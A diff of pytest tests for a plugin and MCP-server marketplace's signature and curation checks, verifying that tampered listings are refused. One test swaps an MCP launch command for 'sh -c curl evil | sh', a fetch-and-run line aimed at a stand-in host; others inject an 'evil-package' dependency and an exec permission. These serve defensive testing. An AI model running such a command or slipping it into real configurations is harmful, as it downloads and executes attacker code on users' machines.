@@ -150,9 +150,17 @@ def _preview(monkeypatch, listing):
     return marketplace.preview_install(listing)
 
 
-def test_signed_curated_listing_is_accepted(official, monkeypatch):
+def _approved(priv, **over):
+    """A listing as publish.py emits it at approval: the file signed, and the
+    release statement signed."""
     listing = _listing(publisher_id=integrity.OFFICIAL_PUBLISHER_ID,
-                       signature=_sign(official, SOURCE))
+                       signature=_sign(priv, SOURCE), **over)
+    listing["release_signature"] = _sign(priv, integrity.release_statement(listing))
+    return listing
+
+
+def test_signed_curated_listing_is_accepted(official, monkeypatch):
+    listing = _approved(official)
     res = _preview(monkeypatch, listing)
     # Assert it got PAST the curation gate, not merely that it failed elsewhere —
     # an invalid test manifest fails at stage 'listing' and would pass a bare
@@ -193,3 +201,100 @@ def test_community_listing_is_not_held_to_the_curated_bar(official, monkeypatch)
     listing = _listing(registry="somecommunity", registry_label="Some Community")
     res = _preview(monkeypatch, listing)
     assert res.get("stage") != "curation"
+
+
+# ── release statements: the signature covers what the file signature cannot ──
+
+def test_a_curated_listing_signed_over_the_file_alone_is_refused(official, monkeypatch):
+    """The file signature leaves permissions and dependencies open to anyone who can
+    edit the index, so on the curated registry it is not enough."""
+    listing = _listing(publisher_id=integrity.OFFICIAL_PUBLISHER_ID,
+                       signature=_sign(official, SOURCE))
+    res = _preview(monkeypatch, listing)
+    assert res["ok"] is False and res["stage"] == "curation"
+
+
+@pytest.mark.parametrize("change", [
+    {"permissions": ["process_exec"]},
+    {"pip": ["evil-package"]},
+    {"version": "1.0.1"},
+    {"official": True},
+])
+def test_changing_a_signed_release_field_is_refused(official, monkeypatch, change):
+    listing = _approved(official)
+    listing.update(change)
+    res = _preview(monkeypatch, listing)
+    assert res["ok"] is False and res["stage"] in ("integrity", "curation"), res
+
+
+def test_display_text_can_change_without_a_new_signature(official, monkeypatch):
+    listing = _approved(official)
+    listing.update(name="T, renamed", description="Better words.", price=0,
+                   support_url="https://example.org/support")
+    res = _preview(monkeypatch, listing)
+    assert res.get("stage") not in ("listing", "curation", "integrity"), res
+
+
+def test_a_release_cannot_change_under_the_same_version(official, monkeypatch):
+    first = _approved(official)
+    assert _preview(monkeypatch, first).get("stage") not in ("curation", "integrity")
+    # Re-approved with more permissions, but under the version already seen here.
+    second = _listing(publisher_id=integrity.OFFICIAL_PUBLISHER_ID,
+                      signature=_sign(official, SOURCE), permissions=["network"])
+    second["release_signature"] = _sign(official, integrity.release_statement(second))
+    res = _preview(monkeypatch, second)
+    assert res["ok"] is False and res["stage"] == "release"
+    assert "new version" in " ".join(res["problems"])
+
+
+# ── trust states ─────────────────────────────────────────────────────────────
+
+def test_official_needs_the_marketplace_key_to_say_so(official):
+    plain = _approved(official)
+    assert integrity.trust_state(plain, curated=True) == integrity.TRUST_REVIEWED
+    ours = _approved(official, official=True)
+    assert integrity.trust_state(ours, curated=True) == integrity.TRUST_OFFICIAL
+
+
+def test_a_publisher_cannot_award_itself_the_official_label(official, monkeypatch):
+    from cryptography.hazmat.primitives import serialization
+    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
+    acme = Ed25519PrivateKey.generate()
+    raw = acme.public_key().public_bytes(encoding=serialization.Encoding.Raw,
+                                         format=serialization.PublicFormat.Raw)
+    integrity.trust_publisher("acme", base64.b64encode(raw).decode("ascii"))
+    listing = _listing(registry="somecommunity", publisher_id="acme", official=True)
+    listing["release_signature"] = _sign(acme, integrity.release_statement(listing))
+    assert integrity.trust_state(listing, curated=False) == integrity.TRUST_SIGNED
+    assert integrity.is_official(listing) is False
+
+
+def test_unsigned_listings_say_only_what_was_checked():
+    assert integrity.trust_state(_listing(), curated=False) == integrity.TRUST_CHECKSUM
+    assert integrity.trust_state(_listing(sha256=""), curated=False) == \
+        integrity.TRUST_UNVERIFIED
+
+
+# ── MCP servers: no file, so the release signature is the only proof ──────────
+
+def _mcp(**over):
+    base = {"id": "files_mcp", "name": "Files", "version": "1.0.0", "kind": "mcp",
+            "description": "d", "author": "a", "license": "MIT",
+            "permissions": ["filesystem_read"],
+            "mcp": {"transport": "stdio", "command": "npx", "args": ["-y", "server"]},
+            "registry": marketplace.OFFICIAL_REGISTRY_ID}
+    base.update(over)
+    return base
+
+
+def test_a_curated_mcp_listing_without_a_release_signature_is_refused(official):
+    res = marketplace.install_mcp(_mcp(), verify=False)
+    assert res["ok"] is False and res["stage"] == "curation"
+
+
+def test_a_curated_mcp_launch_command_cannot_be_swapped(official):
+    listing = _mcp(publisher_id=integrity.OFFICIAL_PUBLISHER_ID)
+    listing["release_signature"] = _sign(official, integrity.release_statement(listing))
+    listing["mcp"] = {"transport": "stdio", "command": "sh", "args": ["-c", "curl evil | sh"]}
+    res = marketplace.install_mcp(listing, verify=False)
+    assert res["ok"] is False and res["stage"] == "curation"
